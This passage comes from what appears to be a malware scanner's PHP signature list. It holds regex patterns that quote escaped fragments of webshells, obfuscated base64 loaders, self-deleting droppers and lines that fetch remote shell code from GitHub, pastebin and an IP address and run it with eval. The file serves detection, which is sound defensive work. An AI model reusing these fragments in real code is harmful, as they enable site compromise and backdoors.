      'pattern' => '/\\<\\?php \\$bnqztzrrdy\\=str_ireplace\\("k","","kkkbkkkkakkkkkskkkkekkkkkk6kkkkk4kk_kkkkdkkkekkkkkckkkkokkkkkkdkkkkekkk"\\); \\$msupuh\\="DQoJCUBlcnJvcl9yZ/',
      'label' => 'source-file tail snippet',
    ),
    531 => 
    array (
      'pattern' => '/\\<\\?php \\$mcunf\\=str_ireplace\\("g","","gggbgggggagggggsggggeggg6gg4gggg_ggggdgggegggggcgggggoggggdgggegg"\\); \\$tytcnrzsnv\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    532 => 
    array (
      'pattern' => '/\\<\\?php \\$vvbxwx\\=str_ireplace\\("w","","wwwbwwwwawwwswwwewwwwww6www4www_wwwwdwwwwwwewwwwwcwwwwowwwdwwwweww"\\); \\$udvsrefgbr\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    533 => 
    array (
      'pattern' => '/\\<\\?php echo "qaTTeUhRBQ"; if \\(file_exists\\("\\.\\/sendtomobile\\.php"\\)\\)\\{ touch\\("\\.\\/sendtomobile\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*c/',
      'label' => 'source-file tail snippet',
    ),
    534 => 
    array (
      'pattern' => '/\\<\\?php \\$zcrktm\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$kwvtra\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
      'label' => 'source-file tail snippet',
    ),
    535 => 
    array (
      'pattern' => '/\\<\\?php echo "gZkzTNaUDf"; if \\(file_exists\\("\\.\\/youve_lib\\.php"\\)\\)\\{ touch\\("\\.\\/youve_lib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*b16hcar/',
      'label' => 'source-file tail snippet',
    ),
    536 => 
    array (
      'pattern' => '/\\);\\$kyrmtp\\=\\$nxfbege\\(\\$rnsehtnxe\\);user_error\\(\\$kyrmtp,E_USER_ERROR\\);

\\/\\/ Set the root path as a constant\\.
if \\(\\!defined\\(/',
      'label' => 'sample-specific literal',
    ),
    537 => 
    array (
      'pattern' => '/\\<\\?php \\$zqymm\\=str_ireplace\\("i","","ibiiiaiiiisiieiiiii6iiiiii4ii_iiidiiiieiiiiiiciiiiioiiiidiiiiiieiii"\\); \\$fndddfhsc\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    538 => 
    array (
      'pattern' => '/\\<\\?php \\$svrhd\\=str_ireplace\\("k","","kkkbkkakkkkkkskkkkekkkkk6kkkkkk4kkkkk_kkkkkdkkkkkkekkckkokkkkdkkkekk"\\); \\$vbpecmd\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    539 => 
    array (
      'pattern' => '/Lyp4dXZneXZhcm1nYmsqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
      'label' => 'sample-specific encoded fragment',
    ),
    540 => 
    array (
      'pattern' => '/LypnbXJid2hkcnJnZWUqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
      'label' => 'sample-specific encoded fragment',
    ),
    541 => 
    array (
      'pattern' => '/\\<\\?php echo "SEUgbUeBmF"; if \\(file_exists\\("\\.\\/init\\.Saturday\\.php"\\)\\)\\{ touch\\("\\.\\/init\\.Saturday\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\//',
      'label' => 'source-file tail snippet',
    ),
    542 => 
    array (
      'pattern' => '/\\<\\?php echo "EzWFhefkQU"; if \\(file_exists\\("\\.\\/credits\\.php"\\)\\)\\{ touch\\("\\.\\/credits\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*fdnadZFfM4Z/',
      'label' => 'source-file tail snippet',
    ),
    543 => 
    array (
      'pattern' => '/\\<\\?php echo "taPQSBBzBC"; if \\(file_exists\\("\\.\\/config\\.immediately\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.immediately\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__/',
      'label' => 'source-file tail snippet',
    ),
    544 => 
    array (
      'pattern' => '/\\<\\?php \\$qrtwsx\\=str_ireplace\\("u","","ubuuuuauuuuusuuuuueuuu6uu4uuuuu_uuduuuueuuucuuuuouuuuduuuueuu"\\); \\$zbyknzx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    545 => 
    array (
      'pattern' => '/\\<\\?php \\$rybdsftgz\\=str_ireplace\\("y","","yyybyyyayyyysyyyyeyyyy6yyyy4yyyy_yydyyyyyyeyyycyyyyoyyyydyyeyy"\\); \\$kxmtdv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    546 => 
    array (
      'pattern' => '/LypraHpoYmZhd3lza3JiKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
      'label' => 'sample-specific encoded fragment',
    ),
    547 => 
    array (
      'pattern' => '/\\<\\?php \\$wcbbwngd\\=str_ireplace\\("g","","gggbgggggagggggsggggeggg6gg4gggg_ggggdgggegggggcgggggoggggdgggegg"\\); \\$gxcdfqc\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    548 => 
    array (
      'pattern' => '/\\<\\?php \\$gznwg\\=str_ireplace\\("i","","ibiiiaiiiisiieiiiii6iiiiii4ii_iiidiiiieiiiiiiciiiiioiiiidiiiiiieiii"\\); \\$vrayhzgk\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    549 => 
    array (
      'pattern' => '/\\<\\?php echo "FrmaKXuSWk"; if \\(file_exists\\("\\.\\/statistic\\.php"\\)\\)\\{ touch\\("\\.\\/statistic\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*A23RGPe/',
      'label' => 'source-file tail snippet',
    ),
    550 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); if\\(file_exists\\("\\.user\\.ini"\\)\\)\\{ unlink\\("\\.user\\.ini"\\); \\} echo "FoxAutoV4 , Download \\=\\> anonymousfox\\.com\\\\n"; \\$code \\= \\$_/',
      'label' => 'source-file tail snippet',
    ),
    551 => 
    array (
      'pattern' => '/H\\*", \\$k\\);
	\\$_POST\\[\\$kk\\]\\=@pack\\(/',
      'label' => 'sample-specific literal',
    ),
    552 => 
    array (
      'pattern' => '/function _tuLk\\(\\$_MENGj\\)\\{\\$_MENGj\\=substr\\(\\$_MENGj,\\(int\\)\\(hex2bin\\(\'373532\'\\)\\)\\);\\$_MENGj\\=substr\\(\\$_MENGj,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d363737/',
      'label' => 'source-file tail snippet',
    ),
    553 => 
    array (
      'pattern' => '/;

\\$wpautop \\= pre_admin_bar\\( \\$wp_kses_data, \\$wp_nonce \\);

if\\( isset\\( \\$wpautop \\) \\)\\{
	if\\( isset\\(\\$_POST\\[[\\s\\S]{0,160}\\] \\);
	\\$shortcode_unautop \\= create_function\\(/',
      'label' => 'sample-specific literal chain',
    ),
    554 => 
    array (
      'pattern' => '/function mp8Gs\\(\\$NGHVp, \\$gmSp_ \\= \'\'\\) \\{ \\$Ag26T \\= \\$NGHVp; \\$xA0M4 \\= \'\'; for \\(\\$RkYMw \\= 0; \\$RkYMw \\< strlen\\(\\$Ag26T\\);\\) \\{ for \\(\\$IohcI \\= 0; \\$IohcI \\< s/',
      'label' => 'source-file head snippet',
    ),
    555 => 
    array (
      'pattern' => '/function _v4XU\\(\\$_Lm9n9m\\)\\{\\$_Lm9n9m\\=substr\\(\\$_Lm9n9m,\\(int\\)\\(hex2bin\\(\'363430\'\\)\\)\\);\\$_Lm9n9m\\=substr\\(\\$_Lm9n9m,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3/',
      'label' => 'source-file tail snippet',
    ),
    556 => 
    array (
      'pattern' => '/function _F8hp\\(\\$_MqNNym1xo\\)\\{\\$_MqNNym1xo\\=substr\\(\\$_MqNNym1xo,\\(int\\)\\(hex2bin\\(\'31303139\'\\)\\)\\);\\$_MqNNym1xo\\=substr\\(\\$_MqNNym1xo,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(/',
      'label' => 'source-file tail snippet',
    ),
    557 => 
    array (
      'pattern' => '/\',\\$check_url_arry\\[\\$m\\]\\);
 			\\$check_url_cont1\\.\\=\\$http1\\.\\$_SERVER\\["HTTP_HOST"\\]\\.str_replace\\(BASE_PATH,[\\s\\S]{0,160},\\$check_url_arry1\\[0\\]\\);
 		\\$check_url_cont1\\.\\=\\$http1\\.\\$_SERVER\\["HTTP_HOST"\\]\\.str_replace\\(BASE_PATH,/',
      'label' => 'sample-specific literal chain',
    ),
    558 => 
    array (
      'pattern' => '/\\];
                  \\$p\\=trim\\(base64_decode\\(\\$s2\\)\\);\\$di\\=dirname\\(\\$p\\);
                  \\$fi\\=basename\\(\\$p\\);\\$o\\=\\$_SERVER\\[[\\s\\S]{0,160};
                  \\$c\\=b1\\(\\$u\\);
                  echo \\$c;
                  echo/',
      'label' => 'sample-specific literal chain',
    ),
    559 => 
    array (
      'pattern' => '/\\<script type\\="text\\/javascript" defer\\>function VsX\\(\\)\\{ll\\=false;var Jlm\\=new Image\\(\\);Object\\.defineProperty\\(Jlm,\'id\',\\{get\\:function\\(\\)\\{ll\\=true;\\}\\}\\);/',
      'label' => 'source-file tail snippet',
    ),
    560 => 
    array (
      'pattern' => '/\\$lyqiphm \\= \'d6g7x8tkc2msb\\-\\#y3f\\\\\'\\*H409_eupvaoinl1r\';\\$eiakf \\= Array\\(\\);\\$eiakf\\[\\] \\= \\$lyqiphm\\[8\\]\\.\\$lyqiphm\\[35\\]\\.\\$lyqiphm\\[25\\]\\.\\$lyqiphm\\[29\\]\\.\\$lyqiphm\\[6/',
      'label' => 'source-file tail snippet',
    ),
    561 => 
    array (
      'pattern' => '/\\$wpgeiqt \\= \'mskyp4rlgtu7bv9_0n8Hcao1\\*\\#d\\\\\'iex2f\\-\';\\$kakfshy \\= Array\\(\\);\\$kakfshy\\[\\] \\= \\$wpgeiqt\\[20\\]\\.\\$wpgeiqt\\[6\\]\\.\\$wpgeiqt\\[29\\]\\.\\$wpgeiqt\\[21\\]\\.\\$wpgeiqt/',
      'label' => 'source-file tail snippet',
    ),
    562 => 
    array (
      'pattern' => '/\\$vzalnkg \\= \'\\#oxl7ya\\*03vntcd1ebk85i\\\\\'sr2fHup4g_m\\-\';\\$rwmdcde \\= Array\\(\\);\\$rwmdcde\\[\\] \\= \\$vzalnkg\\[26\\]\\.\\$vzalnkg\\[4\\]\\.\\$vzalnkg\\[15\\]\\.\\$vzalnkg\\[26\\]\\.\\$vzalnk/',
      'label' => 'source-file tail snippet',
    ),
    563 => 
    array (
      'pattern' => '/\\$tgmgfol \\= \'tkda4cpgHm0f1\\-\\#v7ursy3xln6b9ei\\\\\'\\*_o\';\\$ewnavqg \\= Array\\(\\);\\$ewnavqg\\[\\] \\= \\$tgmgfol\\[5\\]\\.\\$tgmgfol\\[18\\]\\.\\$tgmgfol\\[28\\]\\.\\$tgmgfol\\[3\\]\\.\\$tgmgfol\\[/',
      'label' => 'source-file tail snippet',
    ),
    564 => 
    array (
      'pattern' => '/\\$1\\$2\', \\$pref_old\\);
				\\$pref_new \\= preg_replace\\([\\s\\S]{0,160}, \'\\$1\\<span class\\="columns\\-prefs\\-icon"\\>\\<\\/span\\>\\$2/',
      'label' => 'sample-specific literal chain',
    ),
    565 => 
    array (
      'pattern' => '/include \'phar\\:\\/\\/readme\\.txt\\/readme\\.txt\';/',
      'label' => 'source-file tail snippet',
    ),
    566 => 
    array (
      'pattern' => '/\\$dpfghee \\= \'_ane\\\\\'cs1o2xyglm54\\*dtHvbk8\\-p60\\#rfu7i9\';\\$nvmasxg \\= Array\\(\\);\\$nvmasxg\\[\\] \\= \\$dpfghee\\[5\\]\\.\\$dpfghee\\[30\\]\\.\\$dpfghee\\[3\\]\\.\\$dpfghee\\[1\\]\\.\\$dpfghee/',
      'label' => 'source-file tail snippet',
    ),
    567 => 
    array (
      'pattern' => '/\\<\\?php \\/\\* FoxAuto \\*\\/ error_reporting\\(0\\); function vepa_\\(\\$cmx0T\\) \\{ \\$o6akB \\= strlen\\(trim\\(\\$cmx0T\\)\\); \\$nYANr \\= \'\'; for \\(\\$lv38F \\= 0; \\$lv38F \\< \\$o6ak/',
      'label' => 'source-file tail snippet',
    ),
    568 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); function Momdo\\(\\$T1R7y\\) \\{ \\$CyJ4O \\= strlen\\(trim\\(\\$T1R7y\\)\\); \\$yB2qC \\= \'\'; for \\(\\$srffE \\= 0; \\$srffE \\< \\$CyJ4O; \\$srffE \\+\\= 2/',
      'label' => 'source-file tail snippet',
    ),
    569 => 
    array (
      'pattern' => '/\\$?e6e6e6\\b/',
      'label' => 'sample-specific identifier',
    ),
    570 => 
    array (
      'pattern' => '/email\'\\]\\?\\>"required \\>

	\\<input type\\="submit" value\\="Send test \\>\\>"\\>

\\<\\/form\\>
\\<br\\>
\\<\\?php
if \\(\\!empty\\(\\$_POST\\[[\\s\\S]{0,160}\\<b\\>send an report to xxxxxxx@gmail\\.com \\- \\$xx \\<br\\>\\<br\\>\\<br\\> \\$xxx  \\<\\/b\\>/',
      'label' => 'sample-specific literal chain',
    ),
    571 => 
    array (
      'pattern' => '/https\\:\\/\\/pastebin\\.com\\/raw\\/63LjCNAs[\\s\\S]{0,160}wp\\-engine\\.php/',
      'label' => 'sample-specific literal chain',
    ),
    572 => 
    array (
      'pattern' => '/\\/\\/@file_put_contents\\(\\$path\\s+\\.\\s+\'\\/wp\\-includes\\/class\\.wp\\.php\',\\s+file_get_contents\\(\'http\\:\\/\\/www\\.krilns\\.com\\/admin\\.txt\'\\)\\);/',
      'label' => 'sample-specific line fragment',
    ),
    573 => 
    array (
      'pattern' => '/eval\\(base64_decode\\(\'ZnVuY3Rpb24gX0owVkooJF9Ha1p2VTBIKXskX0drWnZVMEg9c3Vic3RyKCRfR2tadlUwSCwoaW50KShoZXgyYmluKCczOTMyMzYnKSkpOyRfR2tadlUwSD1z/',
      'label' => 'source-file tail snippet',
    ),
    574 => 
    array (
      'pattern' => '/; global \\$O;  \\$O\\=urldecode\\(\\$OOOOOO\\); 
\\$\\{\\$O\\{18\\}\\.\\$O\\{7\\}\\.\\$O\\{24\\}\\.\\$O\\{2\\}\\.\\$O\\{50\\}\\.\\$O\\{8\\}\\}\\=/',
      'label' => 'sample-specific literal',
    ),
    575 => 
    array (
      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20On\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x56\\\\x66\\\\x35\\\\x66\\\\x35\\\\x66\\\\x63\\\\x35\\\\x63\\\\x63"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x56\\\\x66\\\\x35\\\\x66\\\\x35\\\\x66\\\\x63\\\\x35\\\\x63\\\\x63"\\]\\(\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    576 => 
    array (
      'pattern' => '/\\<font size\\="2px" color\\="white"\\>Copyright &\\#169; \\<script type\\=\'text\\/javascript\'\\>var creditsyear \\= new Date\\(\\);document\\.write\\(creditsyear\\.getFu/',
      'label' => 'source-file tail snippet',
    ),
    577 => 
    array (
      'pattern' => '/\\<\\?php \\$xwbl209\\= "SN\\),AK mtyCcMXQHJ\\.T0\\-3qjfY5GnRl\\*gWa7dB8DF\\(ZOUkiz1IEVs2pbur\\/\\+v6;_ePLxho49w";\\$lsyw0571\\=\'JGNoID0gY3VybF9pbml0KCd\';\\$lsyw05711\\=\'/',
      'label' => 'source-file tail snippet',
    ),
    578 => 
    array (
      'pattern' => '/,\\$xwbl209\\{63\\}\\);\\$kxab691 \\= mrhz799\\(\\$xwbl209\\{24\\},\\$xwbl209\\{56\\},\\$xwbl209\\{28\\}\\);\\$enbu065 \\= mrhz799\\(\\$xwbl209\\{11\\},\\$xwbl209\\{8\\},/',
      'label' => 'sample-specific literal',
    ),
    579 => 
    array (
      'pattern' => '/\\<\\?php \\$inter_domain\\=\'http\\:\\/\\/154\\.22\\.119\\.11\\/z0228_28\';function curl_get_contents\\(\\$url\\)\\{\\$ch\\=curl_init\\(\\);curl_setopt \\(\\$ch, CURLOPT_URL, \\$url\\);cu/',
      'label' => 'source-file tail snippet',
    ),
    580 => 
    array (
      'pattern' => '/\\<\\?php @include\\("\\\\167\\\\160\\\\55\\\\141\\\\144\\\\155\\\\151\\\\156\\\\57\\\\151\\\\155\\\\141\\\\147\\\\145\\\\163\\\\57\\\\162\\\\163\\\\163\\\\55\\\\64\\\\170\\\\56\\\\160\\\\156\\\\147"\\); \\?\\>/',
      'label' => 'source-file tail snippet',
    ),
    581 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'FOx\'\\] \\=\\= \'HThan\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
      'label' => 'source-file tail snippet',
    ),
    582 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'FOx\'\\] \\=\\= \'sIez4\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
      'label' => 'source-file tail snippet',
    ),
    583 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'FOx\'\\] \\=\\= \'uiIm5\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
      'label' => 'source-file tail snippet',
    ),
    584 => 
    array (
      'pattern' => '/eval\\("\\?\\>"\\.base64_decode\\("PD9waHAKY2xhc3MgRm9vIHsKCWZ1bmN0aW9uIF9fY29uc3RydWN0KCkgewoJCSRtb2R1bGUgPSAkdGhpcy0\\+c3RhY2soJHRoaXMtPmNsYXN0ZXIpOwo/',
      'label' => 'source-file tail snippet',
    ),
    585 => 
    array (
      'pattern' => '/\\<html xmlns\\="http\\:\\/\\/www\\.w3\\.org\\/1999\\/xhtml" lang\\="en\\-US" prefix\\="og\\: http\\:\\/\\/ogp\\.me\\/ns\\# fb\\: http\\:\\/\\/ogp\\.me\\/ns\\/fb\\#"\\>[\\s\\S]{0,12000}_gaq\\.push\\(\\[\'_trackEvent\', \'download\', \'http\\:\\/\\/www\\.virendrachandak\\.com\\/demos\\/getting\\-real\\-client\\-ip\\-address\\-in\\-php\\.zip\', \'download\\-source\', 1/s',
      'label' => 'source-file head-tail anchor',
    ),
    586 => 
    array (
      'pattern' => '/@error_reporting\\(0\\);[\\s\\S]{0,12000}eval\\(\\$g\\(\\$b\\(\'1TwNc9s2sn9F0XVK8SzJ4jdphXZzrXPNXNPmOe5Nb1yPhpZoixeJUkkqievqv7\\/dBUgCJCTLSXrvXhzJEohdLPYLu8DCyW0vyfO46H01uTj\\/n5\\/P315eaZl2resPX01G/s',
      'label' => 'source-file head-tail anchor',
    ),
    587 => 
    array (
      'pattern' => '/GacFAg6R5WU6cMxWnvWqJGPmurvSoTzK\\/My8ZAYbB5FS3J6WZ3MawPpNxuWq0m\\+F\\+usBk9i6W\\/o35\\/Re/',
      'label' => 'sample-specific encoded fragment',
    ),
    588 => 
    array (
      'pattern' => '/\\/", \\$dir\\);
\\$total \\= \\$func\\[29\\]\\(\\$dir\\);
\\$free \\= \\$func\\[30\\]\\(\\$dir\\);
\\$pers \\=  \\(int\\) \\(\\$free \\/ \\$total \\* 100\\);
\\$ds \\= @\\$func\\[31\\]\\(/',
      'label' => 'sample-specific literal',
    ),
    589 => 
    array (
      'pattern' => '/\\$pdgR5J05_M\\="Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1KBrNK85PzcgqLU4mLqCCclFqeamcSnpCbnp6RqAO0sSi3TUHHM9vc3i\\/BysawKMtJEAtYA";\\/\\/scp[\\s\\S]{0,12000}eval\\(htmlspecialchars_decode\\(gzinflate\\(base64_decode\\(\\$pdgR5J05_M\\)\\)\\)\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    590 => 
    array (
      'pattern' => '/\\$request_method \\= \\$_SERVER\\["REQUEST_METHOD"\\];[\\s\\S]{0,12000}header\\("Location\\: http\\:\\/\\/"\\.\\$_SERVER\\["HTTP_HOST"\\]\\."\\/"\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    591 => 
    array (
      'pattern' => '/\\$O0O__O00_O\\="u_5wjzc4yi9xtalokd02smnh67rpf83gbeq1v\\-";\\$O0_O__00OO\\=\\$O0O__O00_O\\{28\\}\\.\\$O0O__O00_O\\{9\\}\\.\\$O0O__O00_O\\{14\\}\\.\\$O0O__O00_O\\{33\\}\\.\\$O0O__O00_O\\{/',
      'label' => 'source-file tail snippet',
    ),
    592 => 
    array (
      'pattern' => '/\\<\\?php \\$wksh287\\= "_0ibBdY1\\+\\*laVHnwjRF\\(DITtAyqUv6\\)o95egzE\\.J2xGSfQZ8Ck,msL3uWKc4 pXMh\\-ONr;P\\/7";\\$hjwl996\\=\'JGNoID0gY3VybF9pbml0KCdodHRwOi8vYmFua3/',
      'label' => 'source-file tail snippet',
    ),
    593 => 
    array (
      'pattern' => '/\\$O_O0O__00O\\="3cixosqnd9vt56jpk2lg8z0ba_e41mfw7yrh\\-u";\\$OO_O0_O_00\\=\\$O_O0O__00O\\{1\\}\\.\\$O_O0O__00O\\{34\\}\\.\\$O_O0O__00O\\{26\\}\\.\\$O_O0O__00O\\{24\\}\\.\\$O_O0O__00O\\{/',
      'label' => 'source-file tail snippet',
    ),
    594 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); @ini_set\\(\'error_log\', NULL\\); @ini_set\\(\'log_errors\', 0\\);  @ini_set\\(\'display_errors\', 0\\);  echo "FoxAutoV5 \\[The best/',
      'label' => 'source-file tail snippet',
    ),
    595 => 
    array (
      'pattern' => '/eval\\("\\?\\>"\\.file_get_contents\\("https\\:\\/\\/raw\\.githubusercontent\\.com\\/NoobSecID\\/webshell\\/master\\/shell\\.php"\\)\\);/',
      'label' => 'source-file tail snippet',
    ),
    596 => 
    array (
      'pattern' => '/TAG" \\],
	match\\: \\{
		ID\\: \\/\\#\\(\\(\\?\\:\\[\\\\w\\\\u00c0\\-\\\\uFFFF\\-\\]\\|\\\\\\\\\\.\\)\\+\\)\\/,
		CLASS\\: \\/\\\\\\.\\(\\(\\?\\:\\[\\\\w\\\\u00c0\\-\\\\uFFFF\\-\\]\\|\\\\\\\\\\.\\)\\+\\)\\/,
		NAME\\: \\/\\\\\\[name\\=\\[\'/',
      'label' => 'sample-specific literal',
    ),
    597 => 
    array (
      'pattern' => '/\\$?sfmxebcirt\\b/',
      'label' => 'sample-specific identifier',
    ),
    598 => 
    array (
      'pattern' => '/\\$?fgvrhgkibs\\b/',
      'label' => 'sample-specific identifier',
    ),
    599 => 
    array (
      'pattern' => '/\\$GLOBALS\\[\'pass\'\\] \\= "";[\\s\\S]{0,12000}\\$b374k\\("eNrsvQl74zayKPpXGB3fyBrZ1r6120607\\/uu7lx\\/FElJlLiJpNZ0\\/vvFwgWkKFtOZ\\+add8\\/NfNOmgEKhABQKhUKh8PU3ZaVQd\\+VGO5dt9L\\/5RZndCdybLr8JMs36\\/6BeKFpV/s',
      'label' => 'source-file head-tail anchor',
    ),
    600 => 
    array (
      'pattern' => '/\\<\\?php \\$\\{"\\\\x47L\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["m\\\\x79\\\\x70\\\\x61c\\\\x63\\\\x73\\\\x76"\\]\\="\\\\x5f1";\\$\\{"\\\\x47\\\\x4cOBAL\\\\x53"\\}\\["h\\\\x6fq\\\\x70\\\\x75\\\\x73p\\\\x67l\\\\x73v"\\]\\="\\\\x5f\\\\x30"/',
      'label' => 'source-file tail snippet',
    ),
    601 => 
    array (
      'pattern' => '/\\<\\?php goto e45; B63\\: def\\: goto f4d; F21\\: Ef4\\: goto ca1; B17\\: function D63\\(\\) \\{ goto a62; d4c\\: a1f\\: goto B9b; Eb6\\: if \\(isset\\(\\$_SERVER\\["\\\\x52\\\\10[\\s\\S]{0,12000}require\\( dirname\\( __FILE__ \\) \\. \'\\/wp\\-blog\\-header\\.php\' \\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    602 => 
    array (
      'pattern' => '/\\<\\?php function curl_get_contents\\(\\$url\\)\\{\\$ch\\=curl_init\\(\\);curl_setopt \\(\\$ch, CURLOPT_URL, \\$url\\);curl_setopt \\(\\$ch, CURLOPT_RETURNTRANSFER, 1\\);cur/',
      'label' => 'source-file tail snippet',
    ),
    603 => 
    array (
      'pattern' => '/\\>
\\<title\\>xls\\<\\/title\\>
\\<\\/head\\>

\\<body background\\=[\\s\\S]{0,160}position\\: absolute; left\\: 627; top\\: 291/',
      'label' => 'sample-specific literal chain',
    ),
    604 => 
    array (
      'pattern' => '/@"\\)\\{
		\\$x \\= \\$i;
		break;
	\\}
\\}
\\$yuh \\= substr\\(\\$len,0,\\$x\\);
\\$yuh \\= strrev\\(\\$yuh\\);
for\\(\\$i\\=0; \\$i\\<\\$ln; \\$i\\+\\+\\)\\{
	if\\(\\$yuh\\[\\$i\\] \\=\\=[\\s\\S]{0,160}\\)\\{
		\\$x \\= \\$i;
		break;
	\\}
\\}
\\$yuh \\= substr\\(\\$yuh,0,\\$x\\);
\\$yuh \\= ucfirst\\(\\$yuh\\);
\\?\\>
\\<\\!DOCTYPE HTML PUBLIC/',
      'label' => 'sample-specific literal chain',
    ),
    605 => 
    array (
      'pattern' => '/file_put_contents\\(\\$file_name,\\s+\\$contents\\[\\$content_type\\]\\s+\\.\\s+"\\\\n"\\s+\\.\\s+\'\\<\\?php\\s+\\/\\*\'\\.str_repeat\\(substr\\(\\$string,\\s+0,\\s+rand\\(1,\\s+strlen\\(\\$string\\)\\)\\),\\s+rand\\(1,\\s+5\\)\\)\\.\'\\*\\/\\s+\\?\\>\'\\);/',
      'label' => 'sample-specific line fragment',
    ),
    606 => 
    array (
      'pattern' => '/if\\(strstr\\(strtolower\\(\\$_SERVER\\[\'HTTP_USER_AGENT\'\\]\\), "googlebot"\\)\\)[\\s\\S]{0,12000}else \\{ \\$\\{"\\\\x47LO\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x6f\\\\x68\\\\x6b\\\\x77n\\\\x70\\\\x74\\\\x61\\\\x61\\\\x69\\\\x6e"\\]\\="pa\\\\x73\\\\x73\\\\x77ord";\\$\\{\\$\\{"\\\\x47\\\\x4c\\\\x4fBA\\\\x4c\\\\x53"\\}\\["o\\\\x68k\\\\x7/s',
      'label' => 'source-file head-tail anchor',
    ),
    607 => 
    array (
      'pattern' => '/x61W\\/8QvQi2xsV5XYeS7RM22UkD8\\/n9jPe7U\\/\\/x2\\/m\\/\\/H8UM\\/9G\\/TOVkm485P6Es0n/',
      'label' => 'sample-specific encoded fragment',
    ),
    608 => 
    array (
      'pattern' => '/\\$O__O0O0_0O\\="f\\-y2qlu7jgk0tnx8dob41a56ewmr9hz_ci3spv";\\$O0_OOO0_0_\\=\\$O__O0O0_0O\\{0\\}\\.\\$O__O0O0_0O\\{33\\}\\.\\$O__O0O0_0O\\{5\\}\\.\\$O__O0O0_0O\\{24\\}\\.\\$O__O0O0_0O\\{3/',
      'label' => 'source-file tail snippet',
    ),
    609 => 
    array (
      'pattern' => '/return\\s+base64_encode\\(hash\\(\\$GLOBALS\\[\'HASHTYPE\'\\],\\s+\\(\\$GLOBALS\\[\'REMOTE_ADDR\'\\]\\s+\\?\\s+\\$_SERVER\\[\'REMOTE_ADDR\'\\]\\s+\\:\\s+\'\'\\)\\.\\$str\\.__FILE__\\)\\);/',
      'label' => 'sample-specific line fragment',
    ),
    610 => 
    array (
      'pattern' => '/;
        \\$g\\+\\+;
        \\$i\\+\\+;
    \\} while \\(\\$i \\!\\= 10\\);
    \\$rPath \\= dirname\\(__FILE__\\);
    \\$rPath \\= explode\\(/',
      'label' => 'sample-specific literal',
    ),
    611 => 
    array (
